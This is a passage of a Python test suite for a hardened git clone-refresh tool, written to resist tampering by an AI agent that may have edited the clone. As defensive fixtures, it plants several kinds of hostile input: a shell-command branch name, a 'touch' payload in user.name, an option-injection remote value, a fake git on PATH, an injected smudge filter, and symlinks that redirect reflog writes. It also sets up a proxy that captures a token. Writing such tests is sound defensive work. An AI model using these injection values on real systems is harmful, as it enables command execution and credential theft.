            self.assertEqual(self.head(), new)
            expected = "Basic " + base64.b64encode(b"alice_helper:secret-test-password").decode()
            self.assertIn(expected, server.seen, "the clone's helper was never asked, or its answer was not used")
            self.assertNotIn("secret-test-password", answer.line)
            # control: an empty helper on the command line erases the clone's own one, which is why refresh never passes it
            erased = self.git("-c", "credential.helper=", "fetch", "-q", "origin", "main", check=False, extra_env={"GIT_ALLOW_PROTOCOL": "http"})
            self.assertNotEqual(erased.returncode, 0, "control: an empty helper did not erase the clone's own, so the check above proves nothing")

    def test_every_git_call_gets_the_safety_settings_and_none_gets_a_credential_helper(self):
        self.behind_by_one()
        answer, calls, _ = self.recorded_run()
        self.assertAnswer(answer, "updated", "ok")
        self.assertGreaterEqual(len(calls), 14)  # the whole flow went through the recorder
        required = ["core.hooksPath=/dev/null", "core.fsmonitor=false", "core.pager=cat", "gc.auto=0", "maintenance.auto=false", "merge.autoStash=false",
                    "user.name=sdlca-refresh", "user.email=sdlca-refresh@users.noreply.invalid"]
        for call in calls:
            settings = [call[i + 1] for i, arg in enumerate(call[:-1]) if arg == "-c"]
            for setting in required:
                self.assertIn(setting, settings, call)
            self.assertFalse([s for s in settings if s.startswith("credential.")], call)  # an empty helper would erase the clone's own
            self.assertFalse([a for a in call if a.startswith("credential.helper")], call)
        verbs = [next(a for a in call if a in ("--version", "rev-parse", "symbolic-ref", "config", "for-each-ref", "fetch", "rev-list", "merge")) for call in calls]
        self.assertEqual(verbs.count("fetch"), 1)
        self.assertEqual(verbs.count("merge"), 1)
        self.assertEqual(verbs[0], "--version")
        fetch = next(call for call in calls if "fetch" in call)
        # one branch, from the recorded address and not through the remote's name, into a ref of its own and the tracking branch, with no FETCH_HEAD:
        # the end of the line is the one place an address or a ref could be taken for an option
        self.assertEqual(fetch[fetch.index("fetch"):], ["fetch", "--no-tags", "--no-recurse-submodules", "--no-write-fetch-head", "--quiet", "--", self.address,
                                                        "+refs/heads/main:refs/sdlca/refresh-tip", "+refs/heads/main:refs/remotes/origin/main"])
        merge = next(call for call in calls if "merge" in call)
        self.assertEqual(merge[merge.index("merge"):][:5], ["merge", "--ff-only", "--quiet", "--no-edit", "--no-overwrite-ignore"])
        rev_list = next(call for call in calls if "rev-list" in call)
        self.assertEqual(rev_list[-1], "--")  # a file in the clone named like the range cannot be taken for it
        # the clone's own configuration is read before git reads any object, again right before the fetch, and again before the fast-forward,
        # which is the step that runs file filters
        listed = [i for i, call in enumerate(calls) if call[-3:] == ["--local", "--list", "-z"]]
        self.assertEqual(len(listed), 3)
        first_object_read = next(i for i, call in enumerate(calls) if "--verify" in call or "symbolic-ref" in call)
        self.assertLess(listed[0], first_object_read)
        self.assertLess(listed[1], verbs.index("fetch"))
        self.assertGreater(listed[2], verbs.index("fetch"))
        self.assertLess(listed[2], verbs.index("merge"))
        for forbidden in ("pull", "rebase", "reset", "checkout", "clean", "stash", "push", "commit", "switch"):
            self.assertFalse([c for c in calls if forbidden in c], forbidden)

    def test_the_environment_git_gets(self):
        dropped = ("GIT_ASKPASS", "SSH_ASKPASS", "GIT_SSH", "GIT_SSH_COMMAND", "GIT_PROXY_COMMAND", "GIT_EXTERNAL_DIFF", "GIT_WORK_TREE", "GIT_INDEX_FILE",
                   "GIT_OBJECT_DIRECTORY", "GIT_ALTERNATE_OBJECT_DIRECTORIES", "GIT_COMMON_DIR")
        env = {name: "/nonexistent/" + name.lower() for name in dropped}
        env.update(GIT_TERMINAL_PROMPT="1", LC_ALL="de_DE.UTF-8", GIT_DIR=os.path.join(self.other, ".git"))  # GIT_DIR: git would work on another repository if it were kept
        self.push_from_other("greeting.txt", "two\n")
        answer, _, blocks = self.recorded_run(**env)
        self.assertAnswer(answer, "updated", "ok")  # about the clone, not about GIT_DIR's repository
        self.assertGreaterEqual(len(blocks), 10)
        for block in blocks:
            names = {line.split("=", 1)[0] for line in block}
            self.assertFalse(names & set(dropped), names & set(dropped))
            self.assertNotIn("GIT_DIR", names)
            self.assertIn("GIT_TERMINAL_PROMPT=0", block)
            self.assertIn("GIT_NO_LAZY_FETCH=1", block)  # a missing object is never fetched on demand from a promisor remote (git 2.44 and newer)
            self.assertIn("LC_ALL=C", block)
            self.assertIn("GIT_ALLOW_PROTOCOL=file", block)  # the caller set it (these tests need file), so it is kept
            self.assertIn("GIT_CEILING_DIRECTORIES=" + self.tmp.name, block)  # git never looks above the clone's own folder

    def test_the_default_protocol_list_is_https_only(self):
        answer, _, blocks = self.recorded_run(drop=("GIT_ALLOW_PROTOCOL",))
        self.assertAnswer(answer, "failed", "fetch")  # the clone's remote is a local path
        for block in blocks:
            self.assertIn("GIT_ALLOW_PROTOCOL=https", block)

    def test_a_planted_git_in_the_clone_is_never_run_even_when_path_has_a_relative_entry(self):
        with open(os.path.join(self.clone, "git"), "w") as handle:  # an untracked program in the clone, named git
            handle.write('#!/bin/sh\necho ran >> "%s"\nexec "%s" "$@"\n' % (self.marker, REAL_GIT))
        os.chmod(os.path.join(self.clone, "git"), 0o755)
        self.behind_by_one()
        neutral = os.path.join(self.tmp.name, "neutral")
        os.makedirs(neutral)
        path = os.pathsep.join(["", ".", "bin", os.environ["PATH"]])  # an empty entry, a dot and a relative one: all mean a folder next to the current one
        self.assertAnswer(self.refresh(env={"PATH": path}, cwd=neutral), "updated", "ok")
        self.assertFalse(os.path.exists(self.marker), "a program from inside the clone ran")
        # the same from inside the clone, where an empty or dot entry really does name the planted program
        self.git("reset", "-q", "--hard", "HEAD~1")
        self.assertAnswer(self.refresh(env={"PATH": path}, cwd=self.clone), "updated", "ok")
        self.assertFalse(os.path.exists(self.marker), "a program from inside the clone ran when the update was started from there")
        # control: the shell does find it through such a PATH
        subprocess.run(["sh", "-c", "git --version"], env=dict(self.env, PATH=path), cwd=self.clone, capture_output=True, timeout=WATCHDOG)
        self.assertTrue(os.path.exists(self.marker), "control: a relative PATH entry did not find the planted program, so this test proves nothing")

    def test_only_absolute_path_entries_are_kept(self):
        self.assertEqual(refresh.safe_path(":.:bin:/usr/bin::/opt/x:./y:~/z"), "/usr/bin:/opt/x")
        self.assertEqual(refresh.safe_path(""), "")
        self.assertEqual(refresh.safe_path("."), "")
        self.assertEqual(refresh.safe_path(None), os.defpath)



class RecordingProxy:
    """A server on this machine that remembers what it was asked and answers 502: the stand-in for a proxy that somebody put in a clone's
    configuration, and for a host that a rewritten clone points at and that must never be contacted. A request that carries no
    credentials is first answered with a Basic challenge (401), as a host that wants a login does, so that git asks its credential helper
    for the token on every version of git (git 2.46 and newer also sends it at once when http.<url>.proactiveAuth says so). The request
    that carries the token is answered 502."""

    def __init__(self):
        self.seen = []  # (method, path, Authorization header), the challenged request and the retry each
        outer = self

        class Handler(http.server.BaseHTTPRequestHandler):
            def do_GET(self):
                outer.seen.append((self.command, self.path, self.headers.get("Authorization")))
                if self.headers.get("Authorization"):
                    self.send_response(502)
                else:
                    self.send_response(401)
                    self.send_header("WWW-Authenticate", 'Basic realm="stand-in"')
                self.send_header("Content-Length", "0")
                self.end_headers()

            do_CONNECT = do_GET

            def log_message(self, *args):
                pass

        self.server = http.server.ThreadingHTTPServer(("127.0.0.1", 0), Handler)
        self.port = self.server.server_address[1]

    def __enter__(self):
        threading.Thread(target=self.server.serve_forever, daemon=True).start()
        return self

    def __exit__(self, *exc):
        self.server.shutdown()
        self.server.server_close()


class NetworkTests(RefreshCase):
    """Where a request goes, and what it carries, is decided by the clone's configuration, which the agent may have written."""

    def test_a_proxy_named_in_the_clone_configuration_gets_nothing(self):
        with RecordingProxy() as proxy:
            address = "http://world.invalid/world.git"
            self.git("remote", "set-url", "origin", address)
            self.git("config", "--local", "http.proxy", "http://127.0.0.1:%d" % proxy.port)
            env = {"GIT_ALLOW_PROTOCOL": "http"}
            before = self.raw_snapshot()
            answer = self.refresh(env=env, address=address)
            self.assertAnswer(answer, "skipped", "untrusted")
            self.assertIn("http.proxy", answer.text)
            self.assertEqual(proxy.seen, [])
            self.assertEqual(self.raw_snapshot(), before)
            self.git("fetch", "-q", "origin", "main", check=False, extra_env=env)  # control: plain git sends its request to the proxy
            self.assertTrue([seen for seen in proxy.seen if "world.invalid" in seen[1]], proxy.seen)

    def test_the_token_never_reaches_a_proxy_named_in_the_clone_configuration(self):
        """The clone is configured exactly as sdlca-worlds configures it (the helper scoped to the world's host), and then a proxy is added:
        the one setting that makes the request that carries the token go to somebody else."""
        with RecordingProxy() as proxy:
            host = "http://127.0.0.1:59999"  # nothing listens here: a request that arrives at the proxy was sent there on purpose
            address = host + "/world.git"
            self.git("remote", "set-url", "origin", address)
            self.git("config", "--local", "credential.helper", "")
            self.git("config", "--local", "credential.%s.helper" % host, gitcred.helper_command("alice_helper", self.token_file))
            self.git("config", "--local", "http.%s.proactiveAuth" % host, "basic")
            self.git("config", "--local", "http.proxy", "http://127.0.0.1:%d" % proxy.port)
            env = {"GIT_ALLOW_PROTOCOL": "http"}
            self.assertAnswer(self.refresh(env=env, address=address), "skipped", "untrusted")
            self.assertEqual(proxy.seen, [])
            self.git("fetch", "-q", "origin", "main", check=False, extra_env=env)  # control: plain git hands the token to the proxy
            sent = [seen[2] for seen in proxy.seen if seen[2]]
            self.assertTrue(sent, "control: the proxy was not sent the token, so this test proves nothing")
            self.assertEqual(sent[0], "Basic " + base64.b64encode(b"alice_helper:secret-test-password").decode())

    def test_a_certificate_check_that_is_switched_off_or_replaced_in_the_clone_is_not_accepted(self):
        for key, value in (("http.sslVerify", "false"), ("http.sslCAInfo", self.marker + ".pem"), ("http.https://git.spawn.co.sslVerify", "false")):
            with self.subTest(key=key):
                self.git("config", "--local", "--add", key, value)
                self.assertAnswer(self.refresh(), "skipped", "untrusted")
                self.git("config", "--local", "--unset-all", key)
        self.assertAnswer(self.refresh(), "current", "ok")

    def test_the_keys_of_the_http_family_are_judged_one_by_one(self):
        env = {}
        for key in ("http.proxy", "http.sslverify", "http.https://git.spawn.co.sslcainfo", "http.curloptresolve", "http.followredirects", "http.extraheader",
                    "http.cookiefile", "http.savecookies", "http.proactiveauth", "http.https://git.spawn.co.proactiveauthx", "http.somethingnew", "http.https://a.b."):
            with self.subTest(risky=key):
                self.assertTrue(refresh.risky_setting(key, "x", env), key)
        for key in ("http.postbuffer", "http.lowspeedlimit", "http.lowspeedtime", "http.maxrequests", "http.minsessions", "http.noepsv", "http.useragent",
                    "http.version", "http.https://git.spawn.co.proactiveauth", "http.https://git.spawn.co:8443.proactiveauth", "http.https://git.spawn.co/.postbuffer"):
            with self.subTest(harmless=key):
                self.assertFalse(refresh.risky_setting(key, "x", env), key)


class LinkTests(RefreshCase):
    """Git appends to a reflog in place, and the agent may have made a link where it writes: that is how a refresh could be made to write into
    some other file, as the user, outside the agent's tool limits."""

    def victim(self, name="victim.txt"):
        path = os.path.join(self.tmp.name, name)
        with open(path, "w") as handle:
            handle.write("IMPORTANT CONTENT THAT MUST SURVIVE\n")
        return path

    def reflog(self, name="main"):
        return os.path.join(self.clone, ".git", "logs", "refs", "heads", name)

    def plain_fast_forward(self):
        self.git("fetch", "-q", "origin", "main")
        self.git("merge", "-q", "--ff-only", "FETCH_HEAD")

    def test_a_reflog_that_is_a_symbolic_link_is_not_followed(self):
        victim = self.victim()
        os.unlink(self.reflog())
        os.symlink(victim, self.reflog())
        old = self.head()
        self.push_from_other("greeting.txt", "two\n")
        answer = self.refresh()
        self.assertAnswer(answer, "skipped", "untrusted")
        self.assertIn(".git/logs/refs/heads/main", answer.text)
        self.assertEqual(self.read(self.tmp.name, "victim.txt"), "IMPORTANT CONTENT THAT MUST SURVIVE\n")
        self.assertEqual(self.head(), old)
        self.plain_fast_forward()  # control: plain git writes a line of its own into the file the link points to
        self.assertNotEqual(self.read(self.tmp.name, "victim.txt"), "IMPORTANT CONTENT THAT MUST SURVIVE\n", "control: git did not follow the link, so this test proves nothing")

    def test_a_reflog_that_is_a_second_name_for_another_file_is_not_trusted(self):
        victim = self.victim()
        os.unlink(victim)
        os.link(self.reflog(), victim)  # one file with two names: git appends to it, and both names show it
        before = self.read(self.tmp.name, "victim.txt")
        old = self.head()
        self.push_from_other("greeting.txt", "two\n")
        answer = self.refresh()
        self.assertAnswer(answer, "skipped", "untrusted")
        self.assertIn(".git/logs/refs/heads/main", answer.text)
        self.assertEqual(self.read(self.tmp.name, "victim.txt"), before)
        self.assertEqual(self.head(), old)
        self.plain_fast_forward()
        self.assertNotEqual(self.read(self.tmp.name, "victim.txt"), before, "control: git did not write through the second name, so this test proves nothing")

    def test_a_logs_folder_or_a_refs_folder_that_is_a_link_is_not_trusted(self):
        for top, inner in (("logs", None), ("refs", None), ("refs", "heads"), ("logs", "refs")):
            with self.subTest(top=top, inner=inner):
                folder = os.path.join(self.clone, ".git", top, inner) if inner else os.path.join(self.clone, ".git", top)
                moved = folder + ".moved"
                os.rename(folder, moved)
                os.symlink(moved, folder)
                try:
                    answer = self.refresh()
                    self.assertAnswer(answer, "skipped", "untrusted")
                    self.assertIn(os.path.relpath(folder, self.clone), answer.text)
                finally:
                    os.unlink(folder)
                    os.rename(moved, folder)
        self.assertAnswer(self.refresh(), "current", "ok")

    def test_a_link_where_the_fetch_used_to_write_is_never_written_through(self):
        victim = self.victim()
        os.symlink(victim, os.path.join(self.clone, ".git", "FETCH_HEAD"))
        new = self.push_from_other("greeting.txt", "two\n")
        self.assertAnswer(self.refresh(), "updated", "ok")  # FETCH_HEAD is not written at all
        self.assertEqual(self.head(), new)
        self.assertEqual(self.read(self.tmp.name, "victim.txt"), "IMPORTANT CONTENT THAT MUST SURVIVE\n")
        self.git("fetch", "-q", "origin", "main")  # control: a plain fetch overwrites what the link points to
        self.assertNotEqual(self.read(self.tmp.name, "victim.txt"), "IMPORTANT CONTENT THAT MUST SURVIVE\n", "control: git did not write through FETCH_HEAD, so this test proves nothing")

    def test_the_name_in_the_reflog_is_the_kits_and_never_the_clones_own(self):
        """If a link ever slipped past the check, what git would append is a line the kit chose, not text the agent can write."""
        payload = "x; touch %s; echo" % self.marker
        self.git("config", "--local", "user.name", payload)
        self.git("config", "--local", "user.email", "payload@example.invalid")
        identity = ("GIT_AUTHOR_NAME", "GIT_AUTHOR_EMAIL", "GIT_COMMITTER_NAME", "GIT_COMMITTER_EMAIL")  # these would beat any configuration
        self.push_from_other("greeting.txt", "two\n")
        self.assertAnswer(self.refresh(drop=identity), "updated", "ok")
        log = self.read(self.clone, ".git/logs/refs/heads/main")
        last = log.rstrip("\n").split("\n")[-1]
        self.assertIn(" sdlca-refresh <sdlca-refresh@users.noreply.invalid> ", last)
        self.assertNotIn("touch", last)
        self.assertNotIn("payload@example.invalid", last)
        self.git("reset", "-q", "--hard", "HEAD~1")  # control: a plain fast-forward writes the clone's own name, whatever it says
        self.git("fetch", "-q", "origin", "main")
        self.git("merge", "-q", "--ff-only", "FETCH_HEAD", drop_env=identity)
        plain = self.read(self.clone, ".git/logs/refs/heads/main").rstrip("\n").split("\n")[-1]
        self.assertIn("payload@example.invalid", plain, "control: git did not use the clone's name, so the check above proves nothing")


class StateTests(RefreshCase):
    """Odd states of a clone: what git does, what the update says, and what it leaves behind."""

    def behind_by_one(self):
        return self.push_from_other("greeting.txt", "two\n")

    # a configuration that changes while the update runs

    def test_a_filter_added_to_the_configuration_while_the_fetch_runs_is_caught_before_the_fast_forward(self):
        new = self.behind_by_one()
        old = self.head()
        self.write(self.clone, ".git/info/attributes", "* filter=sneaky\n")  # not configuration: the first check cannot see it
        body = ('for a in "$@"; do if [ "$a" = fetch ]; then\n'
                '  "$REAL_GIT" "$@"; rc=$?\n'
                '  printf \'[filter "sneaky"]\\n\\tsmudge = touch "%s"; cat\\n\' "$MARKER" >> "$CLONE_CONFIG"\n'
                '  exit $rc\n'
                'fi; done\n'
                'exec "$REAL_GIT" "$@"\n')
        answer = self.refresh(env={"PATH": self.path_with(self.fake_git(body)), "MARKER": self.marker, "CLONE_CONFIG": os.path.join(self.clone, ".git", "config")})
        self.assertAnswer(answer, "skipped", "untrusted")
        self.assertIn("filter.sneaky.smudge", answer.text)
        self.assertFalse(os.path.exists(self.marker), "the filter ran")
        self.assertEqual(self.head(), old)
        self.assertEqual(self.read(self.clone, "greeting.txt"), "one\n")
        self.git("merge", "-q", "--ff-only", new)  # control: plain git, at the same moment, runs the filter
        self.assertTrue(os.path.exists(self.marker), "control: plain git did not run the filter that was added during the fetch, so this test proves nothing")

    # the tip the update acts on is the one it fetched

    def test_another_fetch_in_the_clone_at_the_same_moment_cannot_change_which_commit_the_branch_moves_to(self):
        self.git("checkout", "-q", "-b", "side", cwd=self.other)
        self.write(self.other, "feature.txt", "work the world has not merged\n")
        self.git("add", ".", cwd=self.other)
        self.git("commit", "-q", "-m", "unmerged work", cwd=self.other)
        self.git("push", "-q", "origin", "side", cwd=self.other)
        self.git("checkout", "-q", "main", cwd=self.other)
        new = self.behind_by_one()
        body = ('for a in "$@"; do if [ "$a" = fetch ]; then\n'
                '  "$REAL_GIT" "$@"; rc=$?\n'
                '  "$REAL_GIT" fetch -q origin refs/heads/side  # somebody else, in the same clone, writes FETCH_HEAD\n'
                '  exit $rc\n'
                'fi; done\n'
                'exec "$REAL_GIT" "$@"\n')
        answer = self.refresh(env={"PATH": self.path_with(self.fake_git(body))})
        self.assertAnswer(answer, "updated", "ok")
        self.assertEqual(self.head(), new)  # the world's main, not the branch that somebody fetched a moment later
        self.assertFalse(os.path.exists(os.path.join(self.clone, "feature.txt")))

    # git half-applies a fast-forward when it cannot lock the branch: so the update looks for the locks first

    def test_a_lock_file_that_would_make_git_half_apply_the_update_is_reported_before_anything_changes(self):
        self.behind_by_one()
        self.push_from_other("extra.txt", "x\n")
        for name in ("index.lock", "HEAD.lock", "refs/heads/main.lock"):
            with self.subTest(lock=name):
                path = os.path.join(self.clone, ".git", name)
                open(path, "w").close()
                before = self.tree_state()
                answer = self.refresh()
                self.assertAnswer(answer, "failed", "merge")
                self.assertIn("lock file", answer.text)
                self.assertIn(name, answer.text)
                self.assertEqual(self.tree_state(), before)  # exactly as it was: no staged files, no new files
                os.unlink(path)
        self.assertAnswer(self.refresh(), "updated", "ok")

    def test_the_control_for_the_lock_files_plain_git_half_applies_the_update(self):
        self.behind_by_one()
        self.push_from_other("extra.txt", "x\n")
        self.git("fetch", "-q", "origin", "main")
        open(os.path.join(self.clone, ".git", "refs", "heads", "main.lock"), "w").close()
        old = self.head()
        self.assertNotEqual(self.git("merge", "-q", "--ff-only", "FETCH_HEAD", check=False).returncode, 0)
        self.assertEqual(self.head(), old)  # the branch did not move
        self.assertEqual(self.read(self.clone, "greeting.txt"), "two\n")  # but the files did
        self.assertIn("A  extra.txt", self.git("status", "--short").stdout)

    # files that git does not protect by default

    def test_an_ignored_file_that_the_update_would_overwrite_is_never_lost(self):
        self.write(self.clone, ".git/info/exclude", "out.txt\n")  # ignored where the world cannot see it
        self.write(self.clone, "out.txt", "LOCAL ONLY, never committed\n")
        self.push_from_other("out.txt", "tracked now\n")
        old = self.head()
        before = self.tree_state()
        answer = self.refresh()
        self.assertAnswer(answer, "failed", "merge")
        self.assertEqual(self.read(self.clone, "out.txt"), "LOCAL ONLY, never committed\n")
        self.assertEqual(self.head(), old)
        self.assertEqual(self.tree_state(), before)
        self.git("merge", "-q", "--ff-only", "origin/main")  # control: git overwrites an ignored file without a word
        self.assertEqual(self.read(self.clone, "out.txt"), "tracked now\n", "control: plain git did not overwrite the ignored file, so this test proves nothing")

    # a clone that is more than a plain folder

    def test_a_clone_with_a_linked_work_tree_is_updated(self):
        self.git("worktree", "add", "-q", "-b", "wt-branch", os.path.join(self.tmp.name, "linked"))
        new = self.behind_by_one()
        self.assertAnswer(self.refresh(), "updated", "ok")  # reading the per-work-tree file used to fail here, and the clone was never updated again
        self.assertEqual(self.head(), new)

    def test_a_work_tree_entry_that_was_never_pruned_does_not_stop_the_update(self):
        linked = os.path.join(self.tmp.name, "linked")
        self.git("worktree", "add", "-q", "-b", "wt-branch", linked)
        shutil.rmtree(linked)  # the folder is gone, the entry in .git/worktrees is not
        new = self.behind_by_one()
        self.assertAnswer(self.refresh(), "updated", "ok")
        self.assertEqual(self.head(), new)

    def test_the_work_tree_configuration_file_may_be_missing_even_when_the_extension_is_on(self):
        self.git("config", "--local", "extensions.worktreeConfig", "true")
        self.git("config", "--local", "core.repositoryformatversion", "1")
        self.assertFalse(os.path.exists(os.path.join(self.clone, ".git", "config.worktree")))
        new = self.behind_by_one()
        self.assertAnswer(self.refresh(), "updated", "ok")
        self.assertEqual(self.head(), new)

    def test_a_work_tree_configuration_file_that_git_does_not_read_is_not_held_against_the_clone(self):
        self.write(self.clone, ".git/config.worktree", "[core]\n\tfsmonitor = %s\n" % self.program())
        self.git("status", "--short")  # the control: with the extension off, git never reads that file, so it never runs the program
        self.assertFalse(os.path.exists(self.marker), "control: git read a file that it should not read, so what this test claims is wrong")
        new = self.behind_by_one()
        self.assertAnswer(self.refresh(), "updated", "ok")
        self.assertEqual(self.head(), new)
        self.assertFalse(os.path.exists(self.marker))

    def test_a_file_named_like_the_range_does_not_confuse_the_update(self):
        new = self.behind_by_one()
        self.write(self.clone, "HEAD..." + new, "an untracked file that is called exactly what the range is\n")
        self.assertAnswer(self.refresh(), "updated", "ok")
        self.assertEqual(self.head(), new)

    def test_a_branch_whose_commit_cannot_be_read_is_a_damaged_clone_and_not_an_empty_one(self):
        head = self.head()
        loose = os.path.join(self.clone, ".git", "objects", head[:2], head[2:])
        self.assertTrue(os.path.exists(loose), "the test needs a loose commit object to damage")
        os.chmod(loose, 0o644)
        os.remove(loose)
        answer = self.refresh()
        self.assertAnswer(answer, "failed", "error")
        self.assertIn("cannot read", answer.text)
        self.assertNotIn("no commits yet", answer.text)

    # which branch, and which remote

    def test_an_upstream_that_is_more_than_a_branch_and_a_remote_is_not_used(self):
        for key, value in (("branch.main.merge", "refs/heads/main:refs/heads/injected"), ("branch.main.merge", "+refs/heads/main"), ("branch.main.merge", "-x"),
                           ("branch.main.remote", "-oevil"), ("branch.main.remote", "has space")):
            with self.subTest(key=key, value=value):
                original = self.git("config", key).stdout.strip()
                self.git("config", key, value)
                branches = self.git("for-each-ref", "--format=%(refname)").stdout
                answer = self.refresh()
                self.assertAnswer(answer, "skipped", "untrusted")
                self.assertEqual(self.git("for-each-ref", "--format=%(refname)").stdout, branches)  # no branch was made
                self.git("config", key, original)
        self.assertAnswer(self.refresh(), "current", "ok")

    def test_a_branch_that_follows_a_remote_not_named_origin_is_updated_from_that_remote(self):
        stale = os.path.join(self.tmp.name, "stale-fork.git")
        self.git("clone", "-q", "--bare", self.world, stale, cwd=self.tmp.name)
        self.git("remote", "rename", "origin", "upstream")
        self.git("remote", "add", "origin", stale)  # an older fork, still called origin
        self.git("fetch", "-q", "origin")
        new = self.behind_by_one()  # the world moves; the fork does not
        answer = self.refresh()
        self.assertAnswer(answer, "updated", "ok")
        self.assertEqual(self.head(), new)
        self.assertEqual(self.git("config", "branch.main.remote").stdout.strip(), "upstream")

    def test_a_head_that_points_outside_refs_heads_counts_as_no_branch(self):
        self.git("symbolic-ref", "HEAD", "refs/remotes/origin/main")
        self.behind_by_one()
        before = self.raw_snapshot()
        self.assertAnswer(self.refresh(), "skipped", "detached")
        self.assertEqual(self.raw_snapshot(), before)

    def test_a_folder_that_is_not_a_work_tree_is_skipped_even_when_the_update_starts_there(self):
        plain = os.path.join(self.tmp.name, "plain")
        os.makedirs(plain)
        self.assertAnswer(self.refresh(clone=plain, cwd=plain), "skipped", "not-git")

    # no shell, and what a clone can make of a name

    def test_a_branch_name_made_of_shell_commands_is_only_a_name(self):
        name = "x;touch${IFS}PWNED;y"  # a valid branch name, and a command line for any shell that is given it
        self.git("checkout", "-q", "-b", name, "origin/main")
        self.assertEqual(self.git("config", "branch.%s.remote" % name).stdout.strip(), "origin")
        answer = self.refresh(cwd=self.clone)
        self.assertAnswer(answer, "current", "ok")
        self.assertEqual(os.listdir(self.clone).count("PWNED"), 0, "the branch name was run as a command")
        self.assertFalse(os.path.exists(os.path.join(self.tmp.name, "PWNED")))
        self.behind_by_one()
        self.assertAnswer(self.refresh(cwd=self.clone), "updated", "ok")
        self.assertFalse(os.path.exists(os.path.join(self.clone, "PWNED")))
        # control: a shell that is handed the same name does run it
        subprocess.run("echo " + name, shell=True, cwd=self.clone, capture_output=True, timeout=WATCHDOG)
        self.assertTrue(os.path.exists(os.path.join(self.clone, "PWNED")), "control: the name is not a command to a shell, so this test proves nothing")

    def test_git_is_always_started_from_a_list_of_arguments_and_never_through_a_shell(self):
        self.behind_by_one()
        real_popen = subprocess.Popen
        with mock.patch.object(subprocess, "Popen", wraps=real_popen) as popen:
            status, code, _ = refresh.refresh(self.clone, self.address, dict(self.env, PATH=os.environ["PATH"]))
        self.assertEqual((status, code), ("updated", "ok"))
        self.assertGreaterEqual(len(popen.call_args_list), 14)
        for call in popen.call_args_list:
            command = call.args[0] if call.args else call.kwargs["command"]
            self.assertIsInstance(command, list)
            self.assertTrue(all(isinstance(part, str) for part in command))
            self.assertFalse(call.kwargs.get("shell"), call)
            self.assertNotIn("executable", call.kwargs)

    # what the update says when git does something unexpected

    def test_a_merge_that_succeeds_without_moving_the_branch_is_not_reported_as_an_update(self):
        self.behind_by_one()
        old = self.head()
        body = 'for a in "$@"; do if [ "$a" = merge ]; then exit 0; fi; done\nexec "$REAL_GIT" "$@"\n'
        answer = self.refresh(env={"PATH": self.path_with(self.fake_git(body))})
        self.assertAnswer(answer, "failed", "merge")
        self.assertIn("did not move", answer.text)
        self.assertEqual(self.head(), old)

    def test_git_is_never_given_the_programs_own_standard_input(self):
        log = os.path.join(self.tmp.name, "stdin-log")
        self.behind_by_one()
        body = 'cat >> "$STDIN_LOG"\nexec "$REAL_GIT" "$@"\n'
        answer = self.refresh(env={"PATH": self.path_with(self.fake_git(body)), "STDIN_LOG": log}, input="EVENT-JSON-WITH-CHAT-TEXT-THAT-GIT-MUST-NOT-SEE")
        self.assertAnswer(answer, "updated", "ok")
        with open(log) as handle:
            self.assertEqual(handle.read(), "")

    def test_settings_that_cannot_be_read_are_a_failed_update_and_not_a_trusted_clone(self):
        for pattern, expected in (("--list", "settings could not be read"), ("--bool", "settings could not be read")):
            with self.subTest(call=pattern):
                body = ('case "$*" in *config*--local*%s*) echo "fatal: simulated" >&2; exit 3;; esac\nexec "$REAL_GIT" "$@"\n' % pattern)
                answer = self.refresh(env={"PATH": self.path_with(self.fake_git(body))})
                self.assertAnswer(answer, "failed", "error")
                self.assertIn(expected, answer.text)

    def test_a_git_that_is_too_old_is_reported_and_one_that_says_something_odd_is_tried(self):
        old = 'case "$*" in *--version*) echo "git version 2.20.1"; exit 0;; esac\nexec "$REAL_GIT" "$@"\n'
        self.behind_by_one()
        before = self.raw_snapshot()
        answer = self.refresh(env={"PATH": self.path_with(self.fake_git(old))})
        self.assertAnswer(answer, "failed", "error")
        self.assertIn("2.20", answer.text)
        self.assertIn("2.29", answer.text)
        self.assertEqual(self.raw_snapshot(), before)
        for said in ("git version 2.29.0", "git version 2.39.3 (Apple Git-146)", "git version 3.0.1", "something nobody has seen"):
            with self.subTest(said=said):
                body = 'case "$*" in *--version*) echo "%s"; exit 0;; esac\nexec "$REAL_GIT" "$@"\n' % said
                self.assertAnswer(self.refresh(env={"PATH": self.path_with(self.fake_git(body))}), "updated", "ok")
                self.git("reset", "-q", "--hard", "HEAD~1")

    @unittest.skipIf(os.geteuid() == 0, "root can read any folder")
    def test_a_clone_folder_that_cannot_be_entered_is_a_failed_update_with_a_traceback_in_the_log_and_exit_status_zero(self):
        os.chmod(self.clone, 0)
        self.addCleanup(os.chmod, self.clone, 0o755)
        result = self.run_raw()
        self.assertEqual(result.returncode, 0)
        self.assertEqual(result.stdout, "failed\terror\tthe update crashed (PermissionError)\n")
        self.assertIn("Traceback", result.stderr)  # the handler appends standard error to its log
        self.assertIn("PermissionError", result.stderr)

    def test_a_crash_inside_the_update_prints_its_traceback_and_still_answers(self):
        captured = io.StringIO()
        with mock.patch.object(refresh, "update", side_effect=RuntimeError("boom: a bug inside the update")), mock.patch.object(sys, "stderr", captured):
            status, code, text = refresh.refresh(self.clone, self.address, dict(self.env, PATH=os.environ["PATH"]))
        self.assertEqual((status, code, text), ("failed", "error", "the update crashed (RuntimeError)"))
        self.assertIn("Traceback", captured.getvalue())
        self.assertIn("boom: a bug inside the update", captured.getvalue())  # the log gets what the answer, which a remote could influence, leaves out

    def test_every_answer_in_the_table_is_known_to_the_handler_and_the_documentation(self):
        """The table in the docstring is the list of what the update can say. The handler must accept each answer (or it counts as failed/error),
        and the two pages that explain the log lines must name each one that is logged: a new answer that is added in one place is caught here."""
        table = re.findall(r"^  (current|updated|skipped|failed) +([a-z-]+) ", refresh.__doc__, re.M)
        self.assertGreaterEqual(len(table), 14)
        self.assertIn(("skipped", "unverified"), table)
        with open(os.path.join(helpers.ROOT, "bin", "sdlca-on-chat")) as handle:
            handler = handle.read()
        pages = {}
        for name in ("docs/configuration.md", "docs/operations.md"):
            with open(os.path.join(helpers.ROOT, name)) as handle:
                pages[name] = handle.read()
        for status, code in table:
            with self.subTest(answer="%s/%s" % (status, code)):
                self.assertIn("%s/%s" % (status, code), handler)
                if (status, code) != ("skipped", "off"):  # the one answer that is never logged
                    for name, page in pages.items():
                        self.assertIn("%s/%s" % (status, code), page, name)

    def test_the_example_file_and_the_documentation_know_the_variable(self):
        with open(os.path.join(helpers.ROOT, "templates", "account.env.example")) as handle:
            example = handle.read()
        self.assertRegex(example, r"(?m)^# SDLCA_REFRESH_TIMEOUT=60 +# .*\(0 turns it off\)$")
        for name in ("docs/configuration.md", "docs/operations.md", "docs/security-model.md"):
            with open(os.path.join(helpers.ROOT, name)) as handle:
